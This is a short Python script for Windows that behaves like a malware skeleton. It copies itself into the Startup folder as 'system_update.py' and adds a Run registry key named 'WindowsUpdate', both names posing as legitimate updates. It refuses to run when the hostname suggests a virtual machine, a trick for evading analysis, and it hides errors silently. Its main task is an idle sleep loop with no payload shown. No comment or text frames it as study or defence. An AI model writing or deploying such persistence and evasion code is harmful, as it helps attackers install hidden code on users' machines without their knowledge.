import os
import platform
import shutil
import winreg as reg

def install():
    app_path = os.path.abspath(__file__)
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'system_update.py')
    
    if not os.path.exists(startup_path):
        shutil.copy(app_path, startup_path)
    
    key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE)
        reg.SetValueEx(key, 'WindowsUpdate', 0, reg.REG_SZ, app_path)
        reg.CloseKey(key)
    except:
        pass

def check_environment():
    vm_indicators = ['vmware', 'virtualbox', 'vbox', 'qemu']
    hostname = platform.node().lower()
    
    if any(indicator in hostname for indicator in vm_indicators):
        return False
    
    return True

def main_task():
    import time
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    if check_environment():
        install()
        main_task()
